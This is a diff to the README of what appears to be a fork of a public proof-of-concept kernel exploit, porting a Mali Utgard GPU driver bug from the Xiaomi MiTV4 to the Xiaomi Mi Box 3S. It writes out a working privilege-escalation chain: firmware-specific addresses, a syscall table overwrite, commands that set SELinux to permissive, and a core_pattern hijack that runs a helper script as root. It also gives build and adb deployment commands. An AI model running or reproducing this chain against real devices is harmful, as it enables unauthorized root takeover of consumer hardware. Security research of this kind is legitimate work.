@@ -2,15 +2,24 @@
 
 **English** | [简体中文](README.zh-CN.md)
 
-> **This fork targets the Xiaomi Mi Box 3S** (MDZ-19-AA, build `8.2.2.817`, Android 6.0.1,
-> kernel `3.14.29-301318-g9206404`). `run.sh` already carries that firmware's two constants
-> (`SLOT_PHYS=1ee77a0`, `KLN_ADDR=ffffffc00111e5d0`) and drives the aarch64 helpers built by
-> this `Makefile`; §2.2 and [PORT_MIBOX3S.md](PORT_MIBOX3S.md) explain why the MiTV4
+> **Origins.** This repository started as a fork of
+> [Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe) (MIT), which
+> documents the same driver bug on a Xiaomi MiTV4 (S905L2). That work builds in turn on
+> the original public research, [lr-m/RIPMaliUtgard](https://github.com/lr-m/RIPMaliUtgard)
+> — see §9. Upstream prose is kept where it still applies; the Mi Box 3S sections, the
+> commands in §1 and the build steps in §8 are this repo's. Added files: `src/gpwrite.c`,
+> `src/kread.c`, `PORT_MIBOX3S.md`, `FINDING_ADDRESSES.md`.
+>
+> **Target.** Xiaomi Mi Box 3S (MDZ-19-AA, build `8.2.2.817`, Android 6.0.1, kernel
+> `3.14.29-301318-g9206404`). `run.sh` already carries that firmware's two constants
+> (`SLOT_PHYS=1ee77a0`, `KLN_ADDR=ffffffc00111e5d0`) and drives the aarch64 helpers this
+> `Makefile` builds; §2.2 and [PORT_MIBOX3S.md](PORT_MIBOX3S.md) explain why the MiTV4
 > addresses used in the rest of this document do not apply to it.
 
 A complete, verified chain that turns an unprivileged `adb shell` (uid 2000,
-`u:r:shell:s0`) into `uid=0` with SELinux permissive on a **Xiaomi MiTV4**
-(Amlogic S905L2, Mali-400, Utgard DDK).
+`u:r:shell:s0`) into `uid=0` with SELinux permissive on a **Xiaomi Mi Box 3S**
+(MDZ-19-AA, Amlogic S905X, Mali-400, Utgard DDK) — and, with its own two constants, on a
+**MiTV4** (S905L2) as described in §2.1.
 
 The kernel-side footprint is tiny: **132 bytes** (`128 + 4`). No ROP, no heap
 spray, no KASLR bypass, no CVE.
@@ -27,14 +36,18 @@ spray, no KASLR bypass, no CVE.
 # syscall 244 straight into that function (arm64: 8-byte entries, args in x0..x5,
 # return in x0; no PAN on this SoC so the kernel can read our user buffers).
 
-gpu_arb_write 1f6f7a0 ffffffc00111f308   # slots -> kallsyms_lookup_name
-kfunc sym memcpy                          # -> 0xffffffc0013e75c0   (resolver!)
+# --- Mi Box 3S, build 8.2.2.817: the constants run.sh ships ---
+gpwrite64 write 1ee77a0 ffffffc00111e5d0  # slots -> kallsyms_lookup_name
+kfunc_new sym memcpy                      # -> 0xffffffc0013e1270   (the resolver)
 
-gpu_arb_write 1f6f7a0 <memcpy>            # slots -> memcpy
-kfunc zero   <selinux_enforcing> 4        # SELinux -> permissive
-kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
-# trigger a coredump -> the kernel runs the helper as root
+gpwrite64 write 1ee77a0 <memcpy>          # same slots -> memcpy
+kfunc_new zero  0xffffffc0020cff24 4      # selinux_enforcing -> 0
+kfunc_new str   0xffffffc001f1c0c8 '|/data/local/tmp/roothelper.sh'
+crash_for_core                            # coredump -> kernel runs the helper as root
 ```
+
+On a MiTV4 the same chain uses that build's two constants
+(`gpu_arb_write 1f6f7a0 ffffffc00111f308`, `kfunc`); see §2.1 and §2.2.
 
 `run.sh` does exactly this, resolving everything except one address at runtime.
 
@@ -42,7 +55,7 @@ kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
 
 ## 2. Affected devices
 
-### 2.1 Verified on
+### 2.1 Verified on (original device): Xiaomi MiTV4
 
 | item | value |
 |---|---|
@@ -54,7 +67,7 @@ kfunc str    <core_pattern> "|/data/local/tmp/roothelper.sh"
 | Mitigations | no KASLR, **no PAN**, PXN present, `panic_on_oops=1`, no seccomp/userns/bpf |
 | Node perms | `/dev/mali` and `/dev/ion` are `crw-rw-rw-` (0666) |
 
-### 2.2 Verified on (second device): Xiaomi Mi Box 3S
+### 2.2 Verified on (this repo's target): Xiaomi Mi Box 3S
 
 | item | value |
 |---|---|
@@ -355,23 +368,22 @@ An alternative that avoids `core_pattern` (also verified): point the slots at
 ## 8. Build and run
 
 ```sh
-# 32-bit helper (ion + mali write engine)
-arm-linux-gnueabihf-gcc -O1 -static -o gpu_arb_write src/gpu_arb_write.c
-# 64-bit helper (syscall-table entry abuse)
-aarch64-linux-gnu-gcc  -O1 -static -o kfunc          src/kfunc.c
-
+# Mi Box 3S target: aarch64 helpers (gpwrite avoids the broken /dev/ion mmap)
+make                     # gpwrite64, kfunc_new, kread, crash_for_core
 # or, with zig as the cross compiler:
 make zig
+# the upstream 32-bit helpers, for MiTV4 / reference:
+make gpu_arb_write gpu_scan
 
-adb push gpu_arb_write kfunc run.sh roothelper.sh /data/local/tmp/
-adb shell 'cd /data/local/tmp && chmod 755 gpu_arb_write kfunc run.sh roothelper.sh && ./run.sh'
+adb push gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh /data/local/tmp/
+adb shell 'cd /data/local/tmp && chmod 755 gpwrite64 kfunc_new kread crash_for_core run.sh roothelper.sh && ./run.sh'
 ```
 
 `run.sh` accepts two overrides if your firmware differs:
 
 ```sh
 KLN_ADDR=ffffffc00...   # kallsyms_lookup_name on your kernel
-SLOT_PHYS=1f6f7a0       # physical address of sys_call_table[244]
+SLOT_PHYS=1ee77a0       # physical address of sys_call_table[244] (Mi Box 3S 8.2.2.817)
 ```
 
 Recovering both on an unknown firmware is the only part this PoC does not
@@ -509,4 +521,6 @@ this bug).
 
 ## 15. License
 
-MIT — see `LICENSE`.
+MIT — see `LICENSE`. The upstream text and code are © 2026 Yeuoly
+([Yeuoly/mitv4-utgard-lpe](https://github.com/Yeuoly/mitv4-utgard-lpe)); the Mi Box 3S
+port added in this repository is released under the same MIT terms.
